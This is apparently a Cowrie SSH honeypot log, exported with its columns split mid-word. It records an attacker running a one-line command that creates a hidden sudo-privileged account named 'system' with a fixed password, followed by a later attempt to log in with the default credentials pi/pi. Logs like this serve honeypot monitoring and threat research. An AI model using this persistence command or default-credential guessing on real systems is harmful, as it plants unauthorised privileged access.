2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
2023-12-01T15:37:42+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
2023-12-01T15:37:42+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
2023-12-01T15:37:43+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 QWym7uzZ) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] CMD:	a	pt	update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 QWym7uzZ) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] CMD:	o	pen	ssl passwd -1 QWym7uzZ
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command openssl
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Comm	an	d n	ot found: openssl passwd -1 QWym7uzZ
2023-12-01T15:37:43+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-01T15:37:43+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
2023-12-01T15:37:43+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command apt
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Comm	an	d n	ot found: apt update
2023-12-01T15:37:43+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command apt
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Comm	an	d n	ot found: apt install sudo curl -y
2023-12-01T15:37:43+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Comm	an	d f	ound: sudo useradd -m -p  system
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Comm	an	d f	ound: sudo usermod -aG sudo system
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command usermod
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command -aG
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Comm	an	d f	ound: sudo usermod -aG sudo system
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command usermod
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command -aG
2023-12-01T15:37:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,35.246.59.211] Can'	t	fin	d command system
2023-12-01T15:37:43+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-01T15:37:44+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
2023-12-01T15:37:44+0000	[HoneyPotSSHTransport,4,35.246.59.211] Closing TTY Log: var/lib/cowrie/tty/7845636070154cc94a9a24dc5e	69	8b8	e8a59f41b0cc4d44bee1579d0d4005aeb after 1 seconds
2023-12-01T15:37:44+0000	[HoneyPotSSHTransport,4,35.246.59.211] avatar root logging out			
2023-12-01T15:37:44+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-12-01T15:37:44+0000	[HoneyPotSSHTransport,4,35.246.59.211] Connection lost after 7 seconds			
2023-12-01T15:52:06+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
2023-12-01T15:52:06+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
2023-12-01T15:52:06+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 73.186.248.40:63326 (172.17.0.2:2222) [session:	6	c00	595df377]
2023-12-01T15:52:06+0000	[HoneyPotSSHTransport,5,73.186.248.40] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2			
2023-12-01T15:52:06+0000	[HoneyPotSSHTransport,5,73.186.248.40] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b			
2023-12-01T15:52:06+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ss	h-	rsa	'
2023-12-01T15:52:06+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'			
2023-12-01T15:52:06+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'			
2023-12-01T15:52:06+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-12-01T15:52:07+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-12-01T15:52:07+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'password'			
2023-12-01T15:52:07+0000	[HoneyPotSSHTransport,5,73.186.248.40] Could not read etc/userdb.txt, default database activated			
2023-12-01T15:52:07+0000	[HoneyPotSSHTransport,5,73.186.248.40] login attempt [b'pi'/b'pi'] failed			
2023-12-01T15:52:08+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' failed auth b'password'			
2023-12-01T15:52:08+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
2023-12-01T15:52:08+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-12-01T15:52:08+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'password'			
2023-12-01T15:52:08+0000	[HoneyPotSSHTransport,5,73.186.248.40] Could not read etc/userdb.txt, default database activated			
